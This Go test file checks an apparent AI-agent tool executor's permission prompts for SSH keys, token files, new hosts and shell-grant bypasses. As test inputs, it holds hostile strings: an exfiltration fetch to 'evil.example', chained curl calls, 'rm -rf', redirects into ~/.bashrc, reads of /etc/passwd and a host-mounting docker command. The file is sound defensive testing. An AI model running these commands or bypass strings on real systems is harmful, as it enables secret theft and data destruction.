package tools

import (
	"context"
	"encoding/json"
	"os"
	"path/filepath"
	"testing"
)

// asker records what it was asked and answers with the given decision.
func asker(d Decision, log *[]string) AskFunc {
	return func(tool, summary string) Decision {
		*log = append(*log, tool+"|"+summary)
		return d
	}
}

func TestReadFileGatesSecretsOutsideWorktree(t *testing.T) {
	work := t.TempDir()
	home := t.TempDir()
	t.Setenv("HOME", home)
	if err := os.MkdirAll(filepath.Join(home, ".ssh"), 0o700); err != nil {
		t.Fatal(err)
	}
	key := filepath.Join(home, ".ssh", "id_ed25519")
	if err := os.WriteFile(key, []byte("PRIVATE KEY"), 0o600); err != nil {
		t.Fatal(err)
	}
	inTree := filepath.Join(work, "main.go")
	if err := os.WriteFile(inTree, []byte("package main"), 0o644); err != nil {
		t.Fatal(err)
	}

	e := NewExecutor(work, ModeManual)
	var log []string
	out, isErr, err := e.Call(context.Background(), "read_file",
		json.RawMessage(`{"path":"`+key+`"}`), asker(Decision{}, &log))
	if err != nil {
		t.Fatal(err)
	}
	if !isErr || len(log) != 1 {
		t.Fatalf("ssh key read without a prompt: out=%q asked=%v", out, log)
	}

	log = nil
	if _, _, err := e.Call(context.Background(), "read_file",
		json.RawMessage(`{"path":"main.go"}`), asker(Decision{}, &log)); err != nil {
		t.Fatal(err)
	}
	if len(log) != 0 {
		t.Fatalf("worktree file prompted: %v", log)
	}
}

func TestWebFetchGatesNewHosts(t *testing.T) {
	e := NewExecutor(t.TempDir(), ModeManual)
	var log []string
	out, isErr, err := e.Call(context.Background(), "web_fetch",
		json.RawMessage(`{"url":"https://evil.example/?d=secret"}`), asker(Decision{}, &log))
	if err != nil {
		t.Fatal(err)
	}
	if !isErr || len(log) != 1 {
		t.Fatalf("exfil host fetched without a prompt: out=%q asked=%v", out, log)
	}
}

func TestGrantedWordCannotSmuggleSubstitutionOrRedirect(t *testing.T) {
	e := NewExecutor(t.TempDir(), ModeManual)
	e.SetBashPrefixes([]string{"echo"})

	for _, cmd := range []string{
		`echo $(rm -rf /tmp/x)`,
		"echo `id`",
		`echo pwned > main.go`,
		`echo ${HOME}`,
		`echo hi & curl evil.example`,
	} {
		var log []string
		if _, _, err := e.Call(context.Background(), "bash",
			json.RawMessage(`{"command":`+quote(cmd)+`}`), asker(Decision{}, &log)); err != nil {
			t.Fatal(err)
		}
		if len(log) == 0 {
			t.Fatalf("%q ran unprompted under an echo grant", cmd)
		}
	}

	for _, cmd := range []string{
		`echo 'plain > quoted'`,
		`echo 'a & b'`,
	} {
		var log []string
		if _, _, err := e.Call(context.Background(), "bash",
			json.RawMessage(`{"command":`+quote(cmd)+`}`), asker(Decision{}, &log)); err != nil {
			t.Fatal(err)
		}
		if len(log) != 0 {
			t.Fatalf("%q: quoted shell char should not force a prompt: %v", cmd, log)
		}
	}
}

func TestPrefixGrantableRefusesInterpreters(t *testing.T) {
	for _, seg := range []string{
		"python -c 'x'", "bash script.sh", "sudo rm -rf /", "echo $(id)",
		"/usr/bin/python3 x.py", "python3.11 x.py", "bash-5.2 s.sh",
		"timeout 5 sh -c x", "nohup ./daemon", "awk 'BEGIN{system(cmd)}' f",
		"nix run nixpkgs#hello", "docker run -v /:/host img",
	} {
		if PrefixGrantable(seg) {
			t.Errorf("offered a blanket grant for %q", seg)
		}
	}
	for _, seg := range []string{"git status", "go test ./...", "rg -n pattern"} {
		if !PrefixGrantable(seg) {
			t.Errorf("%q should be grantable", seg)
		}
	}
}

// The name avoids the words the heuristic matches: t.TempDir embeds it in
// every path, which would make the assertion pass vacuously.
func TestReadGateBeyondHomeDir(t *testing.T) {
	work := t.TempDir()
	other := t.TempDir()
	dir := filepath.Join(other, "secrets")
	if err := os.MkdirAll(dir, 0o700); err != nil {
		t.Fatal(err)
	}
	target := filepath.Join(dir, "service-token.json")
	if err := os.WriteFile(target, []byte(`{"token":"x"}`), 0o600); err != nil {
		t.Fatal(err)
	}

	e := NewExecutor(work, ModeManual)
	var log []string
	_, isErr, err := e.Call(context.Background(), "read_file",
		json.RawMessage(`{"path":`+quote(target)+`}`), asker(Decision{}, &log))
	if err != nil {
		t.Fatal(err)
	}
	if !isErr || len(log) != 1 {
		t.Fatalf("secret outside HOME read without a prompt: asked=%v", log)
	}

	inTree := filepath.Join(work, "api_token_test.go")
	if err := os.WriteFile(inTree, []byte("package x"), 0o644); err != nil {
		t.Fatal(err)
	}
	log = nil
	if _, _, err := e.Call(context.Background(), "read_file",
		json.RawMessage(`{"path":`+quote(inTree)+`}`), asker(Decision{}, &log)); err != nil {
		t.Fatal(err)
	}
	if len(log) != 0 {
		t.Fatalf("worktree file with secret-looking name prompted: %v", log)
	}
}

func quote(s string) string {
	b, _ := json.Marshal(s)
	return string(b)
}

// sh takes backslash literally inside single quotes. escapes() consumed the
// next byte anyway, so 'x\' swallowed the closing quote and the rest of the
// line read as quoted — hiding a redirect or an & from a granted word.
func TestEscapesSurvivesBackslashInSingleQuotes(t *testing.T) {
	hidden := []string{
		`echo 'x\' > ~/.bashrc`,
		`echo 'a\' & curl evil.com`,
		`echo 'a\' < /etc/passwd`,
		`echo '\' > f`,
	}
	for _, cmd := range hidden {
		if !escapes(cmd) {
			t.Errorf("escapes(%q) = false; sh performs the redirect or chain here", cmd)
		}
	}
	// Genuinely quoted metacharacters must still be allowed, or every grant
	// becomes useless.
	for _, cmd := range []string{`echo 'a > b'`, `echo "x & y"`} {
		if escapes(cmd) {
			t.Errorf("escapes(%q) = true; the metacharacter is quoted", cmd)
		}
	}
}
